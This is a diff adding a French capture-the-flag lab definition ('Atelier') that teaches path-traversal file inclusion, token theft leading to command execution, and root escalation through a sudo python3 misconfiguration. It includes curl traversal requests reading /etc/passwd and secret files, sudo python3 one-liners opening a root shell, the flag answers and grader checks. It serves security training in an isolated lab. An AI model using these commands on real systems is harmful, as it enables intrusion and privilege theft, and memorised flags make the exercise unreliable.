@@ -1,0 +1,96 @@
+title: Atelier
+track: offensif
+machine_os: linux
+level: intermediaire
+order: 8
+tags: [machine, web, lfi, traversée de répertoire, path traversal, rce, élévation de privilèges, sudo, python, linux, cve]
+summary: Machine Moyenne Linux - une inclusion de fichier locale (LFI) permet de lire des fichiers arbitraires et d'extraire un jeton d'admin qui débloque une console d'exécution (RCE), puis un sudo python3 mal configuré mène à root. Capture le drapeau utilisateur puis le drapeau root.
+compose: docker-compose.yml
+service: attaquant
+shell: bash
+flags:
+  user: "TDM{4t3l13r_lf1_tr4v3rs33}"
+  root: "TDM{4t3l13r_sud0_pyth0n_r00t}"
+description: |
+  **Machine : Atelier · Moyenne · 🐧 Linux**
+
+  La cible héberge « Atelier Media », qui affiche des pages selon un paramètre. Comme sur une machine Hack
+  The Box, teste si ce paramètre te laisse **sortir du dossier prévu** pour lire d'autres fichiers.
+  Objectif : drapeau **utilisateur** (`user.txt`) puis élévation vers le drapeau **root** (`root.txt`).
+
+  Tout est isolé dans le réseau du lab (`internal`). **Réinitialiser** reconstruit une cible neuve.
+
+  **Pistes.**
+
+  1. Reconnaissance : `curl http://cible/` - la page est servie via `/voir?page=...`.
+  2. Essaie une **traversée de répertoire** : `page=../../../../etc/passwd`. Si tu lis le fichier, c'est
+     une **LFI**. Repère l'utilisateur de service, puis lis directement `user.txt`.
+  3. Lis aussi la configuration pour récupérer le **jeton** de la console (`/opt/jeton.txt`). Avec lui,
+     `/console?jeton=...&cmd=...` exécute des commandes (RCE en tant que `atelier`).
+  4. `sudo -l` : un binaire lançable en root sans mot de passe permet (voir *GTFOBins*) de lire un fichier
+     ou d'ouvrir un shell root : c'est ton chemin vers `root.txt`.
+
+  Outils : `curl`, `nmap`, `python3`.
+cours: |
+  ## Inclusion de fichier locale (LFI) et élévation par sudo
+
+  ### LFI / traversée de répertoire
+
+  Quand une application construit un **chemin de fichier** à partir d'une entrée utilisateur sans la
+  valider, l'attaquant utilise `../` pour **remonter l'arborescence** et lire des fichiers hors du dossier
+  prévu (configurations, secrets, `/etc/passwd`...). CVE marquantes : **CVE-2021-41773** (Apache,
+  traversée → lecture puis RCE), **CVE-2018-1000861**, **CVE-2019-11043**.
+
+  ```
+  curl -s "http://cible/voir?page=../../../../etc/passwd"
+  curl -s "http://cible/voir?page=../../../../home/atelier/user.txt"
+  curl -s "http://cible/voir?page=../../../../opt/jeton.txt"
+  ```
+
+  Le jeton extrait débloque la console : `curl -s -G http://cible/console --data-urlencode "jeton=<J>" --data-urlencode "cmd=id"`.
+
+  ### Élévation de privilèges par sudo (GTFOBins)
+
+  `sudo -l` montre `(root) NOPASSWD: /usr/bin/python3`. Un interpréteur lançable en root est un root
+  immédiat (*GTFOBins*) :
+
+  ```
+  sudo python3 -c 'print(open("/root/root.txt").read())'
+  sudo python3 -c 'import os; os.system("/bin/sh")'   # shell root
+  ```
+
+  ### Côté défense
+
+  Pour la LFI : valider/normaliser le chemin, interdire `..`, servir depuis une liste blanche, et placer
+  les secrets hors de toute racine web. Pour sudo : ne jamais accorder `NOPASSWD` sur un interpréteur.
+docs:
+  - title: OWASP - Path Traversal
+    url: https://owasp.org/www-community/attacks/Path_Traversal
+  - title: GTFOBins - python
+    url: https://gtfobins.github.io/gtfobins/python/
+exercises:
+  - id: reconnaissance
+    title: Repérer l'affichage de pages
+    description: |
+      Récupère la page d'accueil et repère l'endpoint `/voir`. Enregistre la page dans
+      `/root/reponses/accueil.html`.
+    hint: "curl -s http://cible/ | tee /root/reponses/accueil.html"
+    cours: |
+      Comprendre que l'application lit un fichier d'après le paramètre `page` est le point de départ :
+      c'est ce paramètre que tu vas détourner pour lire d'autres fichiers.
+    checks:
+      - desc: La page de la cible a été récupérée
+        run: grep -qi 'Atelier' /root/reponses/accueil.html
+  - id: lfi
+    title: Lire un fichier arbitraire (LFI)
+    description: |
+      Exploite la traversée de répertoire pour lire `/etc/passwd` **sur la cible** et enregistre le
+      résultat dans `/root/reponses/lfi.txt`.
+    hint: "curl -s 'http://cible/voir?page=../../../../etc/passwd' | tee /root/reponses/lfi.txt"
+    cours: |
+      Lire `/etc/passwd` prouve la LFI et révèle les comptes du système (dont `atelier`). À partir de là,
+      tu lis `user.txt`, tu récupères le jeton de la console pour obtenir une RCE, puis tu élèves tes
+      privilèges.
+    checks:
+      - desc: La LFI lit /etc/passwd
+        run: grep -q 'root:.*:0:0:' /root/reponses/lfi.txt
